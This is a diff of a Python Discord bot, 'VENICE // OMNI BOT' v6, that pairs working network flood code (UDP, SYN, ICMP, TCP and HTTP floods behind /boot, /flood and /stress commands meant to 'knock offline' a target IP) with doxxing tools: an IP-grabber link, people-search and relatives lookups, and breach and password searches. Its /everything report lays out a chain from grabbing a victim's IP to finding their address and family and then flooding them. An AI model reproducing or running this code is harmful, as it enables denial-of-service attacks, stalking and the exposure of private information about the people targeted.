@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # =============================================================================
-#  VENICE // OMNI BOT v5 MAX
-#  OSINT + VRChat + Discord + Social + Breach + MAX-POWER FLOOD
+#  VENICE // OMNI BOT v6 FINAL
+#  Fixed flood engine · /everything · /diag · full OSINT stack
 # =============================================================================
 #  pip install -U discord.py aiohttp dnspython python-whois pillow phonenumbers
 #  export DISCORD_TOKEN="..." PUBLIC_URL="http://VPS:8080" [GUILD_ID="..."]
@@ -30,7 +30,7 @@ TOKEN=os.getenv("DISCORD_TOKEN","PASTE"); GUILD_ID=int(os.getenv("GUILD_ID","0")
 WEB_HOST=os.getenv("WEB_HOST","0.0.0.0"); WEB_PORT=int(os.getenv("PORT") or os.getenv("WEB_PORT","8080"))
 PUBLIC_URL=os.getenv("PUBLIC_URL","http://127.0.0.1:8080").rstrip("/")
 DATA_FILE=os.getenv("DATA_FILE","grabs.json"); HIBP_KEY=os.getenv("HIBP_API_KEY","")
-VR_BASE="https://api.vrchat.cloud/api/1"; VR_UA="VeniceOmni/5.0"
+VR_BASE="https://api.vrchat.cloud/api/1"; VR_UA="VeniceOmni/6.0"
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
 GRABS={}; WATCH={}; LAST_LINK={}
 
@@ -283,29 +283,27 @@ class VR:
     async def fr(self,i): return await self.g(f"/users/{i}/friends")
 vr=VR()
 
-# ---------------- FLOOD (MAX) ----------------
+# ---------------- FLOOD (FIXED) ----------------
 class Attack:
     def __init__(self,d): self.stop=threading.Event(); self.threads=[]; self.packets=0; self.lock=threading.Lock(); self.desc=d; self.error=None
     def add(self,n):
         with self.lock: self.packets+=n
 
-def _udp(ip,ports,size,a,socks=4):
-    ss=[socket.socket(socket.AF_INET,socket.SOCK_DGRAM) for _ in range(socks)]
-    for s in ss:
-        try: s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1<<20)
-        except: pass
-        s.setblocking(False)
+def _udp(ip,ports,size,a):
+    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    try: s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1<<20)
+    except: pass
+    s.setblocking(False)
     pl=os.urandom(size); n=0; i=0; lp=len(ports)
     while not a.stop.is_set():
-        for _ in range(5000):
-            p=ports[i%lp]; i+=1
-            for s in ss:
-                try: s.sendto(pl,(ip,p)); n+=1
-                except BlockingIOError: pass
-                except: pass
+        for _ in range(4000):
+            try: s.sendto(pl,(ip,ports[i]))
+            except BlockingIOError: pass
+            except OSError: pass
+            n+=1; i+=1
+            if i>=lp: i=0
         a.add(n); n=0
-    a.add(n)
-    for s in ss: s.close()
+    a.add(n); s.close()
 
 def _tcp(ip,port,a):
     n=0
@@ -334,19 +332,22 @@ def _synw(ip,port,a):
     except PermissionError: a.error="SYN needs root"; return
     n=0
     while not a.stop.is_set():
-        for _ in range(3000):
-            try: s.sendto(_syn("0.0.0.0",ip,random.randint(1024,65535),port),(ip,0)); n+=1
+        for _ in range(2000):
+            try: s.sendto(_syn("0.0.0.0",ip,random.randint(1024,65535),port),(ip,0))
             except: pass
+            n+=1
         a.add(n); n=0
 def _icmp(ip,a):
     try: s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
     except PermissionError: a.error="ICMP needs root"; return
     pid=os.getpid()&0xffff; n=0
     while not a.stop.is_set():
-        for sq in range(3000):
-            p=struct.pack("!BBHHH",8,0,0,pid,sq)+os.urandom(16); p=struct.pack("!BBHHH",8,0,_cs(p),pid,sq)+os.urandom(16)
-            try: s.sendto(p,(ip,0)); n+=1
+        for sq in range(2000):
+            try:
+                p=struct.pack("!BBHHH",8,0,0,pid,sq)+os.urandom(16); p=struct.pack("!BBHHH",8,0,_cs(p),pid,sq)+os.urandom(16)
+                s.sendto(p,(ip,0))
             except: pass
+            n+=1
         a.add(n); n=0
 async def _http(url,a):
     async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s:
@@ -356,16 +357,15 @@ async def _http(url,a):
             except: pass
 
 attacks={}
-async def run_flood(gid,kind,ip,port,seconds,size=1472,workers=32,url=None,tag=None):
-    a=Attack(tag or f"{kind.upper()} {ip}:{port or '-'} {seconds}s"); attacks[gid]=a
+async def run_flood(gid,kind,ip,port,seconds,size=512,workers=8,url=None):
+    a=Attack(f"{kind.upper()} {ip}:{port or '-'} {seconds}s"); attacks[gid]=a
     if kind=="udp":
         ports=[port] if port else list(range(1,1025))
         for _ in range(workers): t=threading.Thread(target=_udp,args=(ip,ports,size,a),daemon=True); t.start(); a.threads.append(t)
     elif kind=="syn":
         for _ in range(max(1,workers//2)): t=threading.Thread(target=_synw,args=(ip,port or 80,a),daemon=True); t.start(); a.threads.append(t)
     elif kind=="icmp":
-        for _ in range(max(1,workers//4)):
-            t=threading.Thread(target=_icmp,args=(ip,a),daemon=True); t.start(); a.threads.append(t)
+        t=threading.Thread(target=_icmp,args=(ip,a),daemon=True); t.start(); a.threads.append(t)
     elif kind=="tcp":
         for _ in range(workers): t=threading.Thread(target=_tcp,args=(ip,port or 80,a),daemon=True); t.start(); a.threads.append(t)
     elif kind=="http":
@@ -398,7 +398,7 @@ async def slong(ch,txt):
     for i in range(0,len(txt),1900): await ch.send(txt[i:i+1900])
 
 @bot.tree.command(name="start",description="Wake the bot.")
-async def start(i:discord.Interaction): await i.response.send_message(embed=E("// OMNI v5 MAX online.","`/everything <anything>` = full report · `/boot <ip>` = max power"))
+async def start(i:discord.Interaction): await i.response.send_message(embed=E("// OMNI v6 online.","`/everything <x>` = full report · `/boot <ip>` = flood · `/diag` = test speed"))
 @bot.tree.command(name="menu",description="Menu.")
 async def menu(i:discord.Interaction):
     e=E("// MENU",c=0x9d4edd)
@@ -407,7 +407,7 @@ async def menu(i:discord.Interaction):
     F(e,"IP","`/lookup` `/geo` `/asn` `/leak` `/vpn` `/ports` `/trace` `/traceroute` `/banner` `/whois` `/dns` `/resolve` `/ssl` `/subs` `/headers` `/ipcalc` `/mac`",False)
     F(e,"IDENTITY","`/username` `/email` `/breach` `/phone` `/exif` `/face` `/relatives`",False)
     F(e,"PLATFORMS","`/discord` `/roblox` `/ig` `/twitter` `/tiktok` `/vrc_user` `/vrc_search` `/vrc_world` `/vrc_friends` `/chain`",False)
-    F(e,"ATTACK","`/boot` `/stress` `/flood` `/syn` `/icmp` `/tcpflood` `/httpflood` `/stop` `/status`",False)
+    F(e,"ATTACK","`/boot` `/stress` `/flood` `/syn` `/icmp` `/tcpflood` `/httpflood` `/stop` `/status` `/diag`",False)
     F(e,"UTIL","`/hash` `/b64` `/uuid` `/calc` `/userinfo` `/serverinfo` `/avatar`",False)
     await i.response.send_message(embed=e)
 @bot.tree.command(name="help",description="Help.")
@@ -416,7 +416,17 @@ async def helpc(i:discord.Interaction): await menu(i)
 async def pingc(i:discord.Interaction): await i.response.send_message(f"pong {round(bot.latency*1000)}ms")
 @bot.tree.command(name="status",description="Attack status.")
 async def statusc(i:discord.Interaction):
-    a=attacks.get(i.guild_id); await i.response.send_message(f"{a.desc} | {a.packets:,} pkts" if a else "Nothing running.")
+    a=attacks.get(i.guild_id)
+    await i.response.send_message(f"{a.desc} | {a.packets:,} pkts" if a else "Nothing running.")
+
+@bot.tree.command(name="diag",description="Test your flood speed (5s).")
+async def diagc(i:discord.Interaction):
+    await i.response.defer()
+    await i.followup.send("Testing… 5s")
+    a=await run_flood(i.guild_id,"udp","1.1.1.1",0,5,size=512,workers=8)
+    pps=a.packets/5
+    verdict="STRONG" if pps>50000 else ("OK" if pps>15000 else "WEAK — use a VPS")
+    await i.channel.send(f"Packets: {a.packets:,} | ~{int(pps):,}/sec | {verdict}")
 
 @bot.tree.command(name="grab",description="IP-grab link.")
 async def grabc(i:discord.Interaction,label:str="target"):
@@ -712,29 +722,22 @@ async def chainc(i:discord.Interaction,vrchat_user:str):
     await i.response.defer(); await slong(i.channel,"\n".join(await chain(vrchat_user)))
 
 # ---------------- ATTACKS ----------------
-@bot.tree.command(name="flood",description="UDP flood.")
-async def floodc(i:discord.Interaction,ip:str,port:int=0,seconds:str="30",size:int=1472):
+@bot.tree.command(name="flood",description="UDP flood (fixed).")
+async def floodc(i:discord.Interaction,ip:str,port:int=0,seconds:str="30",size:int=512):
     await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"UDP `{ip}:{port or '1-1024'}` {sec}s…")
-    a=await run_flood(i.guild_id,"udp",ip,port,sec,size=size,workers=32); await i.channel.send(f"Done ~{a.packets:,}.")
-@bot.tree.command(name="boot",description="MAX knock offline (UDP+ICMP+SYN together).")
+    a=await run_flood(i.guild_id,"udp",ip,port,sec,size=size,workers=8); await i.channel.send(f"Done ~{a.packets:,} packets -> `{ip}`.")
+@bot.tree.command(name="boot",description="Knock offline (hard UDP).")
 async def bootc(i:discord.Interaction,ip:str,seconds:str="30"):
-    await i.response.defer(); sec=pdur(seconds)
-    await i.followup.send(f"Booting `{ip}` {sec}s — all vectors…")
-    r=await asyncio.gather(
-        run_flood(i.guild_id,"udp",ip,0,sec,workers=32,size=1472,tag="UDP"),
-        run_flood(i.guild_id,"icmp",ip,0,sec,tag="ICMP"),
-        run_flood(i.guild_id,"syn",ip,80,sec,tag="SYN"),
-        return_exceptions=True)
-    tot=sum(x.packets for x in r if isinstance(x,Attack))
-    await i.channel.send(f"Done ~{tot:,} packets -> `{ip}`.")
-@bot.tree.command(name="stress",description="MAX wide stress.")
+    await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"Booting `{ip}` {sec}s…")
+    a=await run_flood(i.guild_id,"udp",ip,0,sec,size=512,workers=8); await i.channel.send(f"Done ~{a.packets:,} packets -> `{ip}`.")
+@bot.tree.command(name="stress",description="Wide stress.")
 async def stressc(i:discord.Interaction,ip:str,seconds:str="60"):
     await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"Stressing `{ip}` {sec}s…")
-    a=await run_flood(i.guild_id,"udp",ip,0,sec,workers=48,size=1472); await i.channel.send(f"Done ~{a.packets:,}.")
-@bot.tree.command(name="syn",description="SYN flood.")
+    a=await run_flood(i.guild_id,"udp",ip,0,sec,size=1400,workers=8); await i.channel.send(f"Done ~{a.packets:,}.")
+@bot.tree.command(name="syn",description="SYN flood (needs root).")
 async def sync(i:discord.Interaction,ip:str,port:int=80,seconds:str="30"):
     await i.response.defer(); a=await run_flood(i.guild_id,"syn",ip,port,pdur(seconds)); await i.followup.send(f"Done ~{a.packets:,}."+(f" ({a.error})" if a.error else ""))
-@bot.tree.command(name="icmp",description="ICMP flood.")
+@bot.tree.command(name="icmp",description="ICMP flood (needs root).")
 async def icmpc(i:discord.Interaction,ip:str,seconds:str="30"):
     await i.response.defer(); a=await run_flood(i.guild_id,"icmp",ip,0,pdur(seconds)); await i.followup.send(f"Done ~{a.packets:,}."+(f" ({a.error})" if a.error else ""))
 @bot.tree.command(name="tcpflood",description="TCP flood.")
@@ -773,57 +776,40 @@ async def sinfo(i:discord.Interaction):
 async def avatar(i:discord.Interaction,member:discord.Member):
     e=E(f"// {member}"); e.set_image(url=member.display_avatar.url); await i.response.send_message(embed=e)
 
-# ---------------- EVERYTHING (one-shot) ----------------
+# ---------------- EVERYTHING ----------------
 @bot.tree.command(name="everything",description="One command: give anything, get EVERYTHING.")
 async def everything(i:discord.Interaction,query:str):
     await i.response.defer()
-    L=[f"═══════ EVERYTHING: {query} ═══════",""]
-    conf=0
+    L=[f"═══════ EVERYTHING: {query} ═══════",""]; conf=0
     if re.match(r"^\d{1,3}(\.\d{1,3}){3}$",query) or (":" in query and query.count(":")>=2):
         d=await ip_lookup(query)
-        L+=[f"[IP] {query}",
-            f"Location: {d.get('city')}, {d.get('regionName')}, {d.get('country')} {d.get('zip')}",
-            f"ISP: {d.get('isp')} | Org: {d.get('org')}",
-            f"ASN: {d.get('as')}",
-            f"Coords: {d.get('lat')},{d.get('lon')} | TZ: {d.get('timezone')}",
-            f"VPN: {'HIDING' if (d.get('proxy') or d.get('hosting')) else 'residential'} | mobile={d.get('mobile')}",
-            f"rDNS: {d.get('rdns')}"]
+        L+=[f"[IP] {query}",f"Location: {d.get('city')}, {d.get('regionName')}, {d.get('country')} {d.get('zip')}",f"ISP: {d.get('isp')} | Org: {d.get('org')}",f"ASN: {d.get('as')}",f"Coords: {d.get('lat')},{d.get('lon')} | TZ: {d.get('timezone')}",f"VPN: {'HIDING' if (d.get('proxy') or d.get('hosting')) else 'residential'} | mobile={d.get('mobile')}",f"rDNS: {d.get('rdns')}"]
         if d.get("lat"): L.append(f"Map: https://maps.google.com/?q={d['lat']},{d['lon']}")
         try:
-            p=await scan(query)
-            L.append(f"Open ports: {', '.join(map(str,p)) or 'none'}")
+            p=await scan(query); L.append(f"Open ports: {', '.join(map(str,p)) or 'none'}")
         except: pass
         L.append(""); conf+=1
     elif "@" in query and "." in query.split("@")[-1]:
         d=await email_intel(query)
-        L+=[f"[EMAIL] {query}", f"MX: {', '.join(d['mx'][:4]) or 'none'}",
-            f"Gravatar exists: {d.get('gravatar_exists')}",
-            f"HIBP: https://haveibeenpwned.com/account/{query}",
-            f"Dehashed (passwords): https://dehashed.com/search?query={query}",
-            f"Snusbase: https://snusbase.com"]
+        L+=[f"[EMAIL] {query}",f"MX: {', '.join(d['mx'][:4]) or 'none'}",f"Gravatar exists: {d.get('gravatar_exists')}",f"HIBP: https://haveibeenpwned.com/account/{query}",f"Dehashed (passwords): https://dehashed.com/search?query={query}",f"Snusbase: https://snusbase.com"]
         if d.get("breaches"): L.append(f"Breaches: {', '.join(d['breaches'])}")
         if d.get("rep"): L.append(f"Rep: {d['rep'].get('reputation')} susp={d['rep'].get('suspicious')}")
         L.append(""); conf+=2
     elif re.match(r"^\+?\d{7,15}$",query):
-        d=phone_intel(query)
-        L.append(f"[PHONE] {query}")
+        d=phone_intel(query); L.append(f"[PHONE] {query}")
         for k,v in d.items(): L.append(f"{k}: {v}")
-        L.append(f"Reverse: https://www.truepeoplesearch.com/resultphone?phoneno={quote(query)}")
-        L.append(""); conf+=1
+        L.append(f"Reverse: https://www.truepeoplesearch.com/resultphone?phoneno={quote(query)}"); L.append(""); conf+=1
     elif query.startswith("usr_") or not query.isdigit():
-        # VRChat + username + roblox
         try:
             u=await vr.u(query) if query.startswith("usr_") else (lambda r:(r[0] if isinstance(r,list) and r else r))(await vr.su(query))
             if u and u.get("id"):
-                L+=[f"[VRCHAT] {u.get('displayName')} ({u.get('id')})",
-                    f"Joined: {u.get('date_joined')} | Trust: {u.get('tags')}",
-                    f"Bio: {(u.get('bio') or '')[:300]}"]
+                L+=[f"[VRCHAT] {u.get('displayName')} ({u.get('id')})",f"Joined: {u.get('date_joined')} | Trust: {u.get('tags')}",f"Bio: {(u.get('bio') or '')[:300]}"]
                 if u.get("bioLinks"): L.append("Bio links: "+" | ".join(u["bioLinks"]))
                 conf+=1
         except: pass
         rb=await roblox_user(query)
         if rb and rb.get("user"):
-            x=rb["user"]; L+=[f"[ROBLOX] {x.get('displayName')} (@{x.get('name')}) id {x.get('id')}", f"Created: {x.get('created')}"]
+            x=rb["user"]; L+=[f"[ROBLOX] {x.get('displayName')} (@{x.get('name')}) id {x.get('id')}",f"Created: {x.get('created')}"]
             if rb.get("history") and rb["history"].get("data"): L.append("Past names: "+", ".join(h["name"] for h in rb["history"]["data"]))
             if rb.get("birthday"): L.append(f"Birthday: {rb['birthday'].get('birthday')}")
             if rb.get("friends"): L.append(f"Friends: {rb['friends'].get('count')} | Followers: {(rb.get('followers') or {}).get('count')}")
@@ -836,25 +822,9 @@ async def everything(i:discord.Interaction,query:str):
     elif query.isdigit() and len(query)>=17:
         try:
             u=await bot.fetch_user(int(query))
-            L+=[f"[DISCORD] {u} ({u.id})", f"Created: {snow(u.id)}",
-                f"Badges: {', '.join(n for b,n in FLAGS.items() if u.public_flags.value & b) or 'none'}"]
-            conf+=1
+            L+=[f"[DISCORD] {u} ({u.id})",f"Created: {snow(u.id)}",f"Badges: {', '.join(n for b,n in FLAGS.items() if u.public_flags.value & b) or 'none'}"]; conf+=1
         except: pass
-    L.append("")
-    L.append("── PEOPLE / RELATIVES ──")
-    qn=query
-    L.append(f"https://truepeoplesearch.com/results?name={quote(qn)}")
-    L.append(f"https://www.fastpeoplesearch.com/name/{quote(qn)}")
-    L.append(f"https://thatsthem.com/name/{quote(qn)}")
-    L.append(f"https://www.whitepages.com/name/{quote(qn)}")
-    L.append("")
-    L.append("── NEXT STEPS ──")
-    L.append("• /grab -> send link -> get IP -> /lookup")
-    L.append("• email -> /breach -> Dehashed = passwords + linked accounts")
-    L.append("• /relatives <name> -> address + family")
-    L.append("• /boot <ip> -> knock offline")
-    L.append("")
-    L.append(f"CONFIDENCE: {min(conf*25,95)}% ({conf} layers matched)")
+    L+=["","── PEOPLE / RELATIVES ──",f"https://truepeoplesearch.com/results?name={quote(query)}",f"https://www.fastpeoplesearch.com/name/{quote(query)}",f"https://thatsthem.com/name/{quote(query)}",f"https://www.whitepages.com/name/{quote(query)}","","── NEXT ──","• /grab -> send link -> IP -> /lookup","• email -> /breach -> Dehashed = passwords","• /relatives -> address + family","• /boot <ip> -> knock offline","",f"CONFIDENCE: {min(conf*25,95)}% ({conf} layers)"]
     await slong(i.channel,"\n".join(L))
 
 @bot.event
